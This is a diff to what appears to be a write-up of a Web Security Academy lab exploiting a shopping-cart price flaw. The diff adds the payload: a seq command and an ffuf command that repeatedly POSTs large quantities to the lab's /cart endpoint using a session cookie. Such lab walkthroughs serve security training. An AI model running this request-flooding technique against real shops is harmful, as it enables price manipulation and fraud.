@@ -26,3 +26,37 @@ After this attack in my basket I can see, that my total price increase and sudde
 ![image](https://github.com/user-attachments/assets/c6a47d37-e22b-4f57-a6fe-0104555607d6)
 
 We did it!
+
+payload used: 
+
+```
+seq 1 321 > dummy.txt
+```
+
+```
+ffuf -u https://0ac20098047e5f6780c2d55400800054.web-security-academy.net/cart \
+  -X POST \
+  -H "Host: 0ac20098047e5f6780c2d55400800054.web-security-academy.net" \
+  -H "Cookie: session=E8zsSiNRpn9sDEEod8dihryMut9IuGpo" \
+  -H "Cache-Control: max-age=0" \
+  -H "Sec-Ch-Ua: \"Not;A=Brand\";v=\"24\", \"Chromium\";v=\"128\"" \
+  -H "Sec-Ch-Ua-Mobile: ?0" \
+  -H "Sec-Ch-Ua-Platform: \"Linux\"" \
+  -H "Accept-Language: en-US,en;q=0.9" \
+  -H "Upgrade-Insecure-Requests: 1" \
+  -H "Origin: https://0ac20098047e5f6780c2d55400800054.web-security-academy.net" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36" \
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
+  -H "Sec-Fetch-Site: same-origin" \
+  -H "Sec-Fetch-Mode: navigate" \
+  -H "Sec-Fetch-User: ?1" \
+  -H "Sec-Fetch-Dest: document" \
+  -H "Referer: https://0ac20098047e5f6780c2d55400800054.web-security-academy.net/product?productId=1" \
+  -H "Accept-Encoding: gzip, deflate, br" \
+  -H "Priority: u=0, i,FUZZ" \
+  -d "productId=1&redir=PRODUCT&quantity=99" \
+  -w dummy.txt \
+  -t 1
+
+```
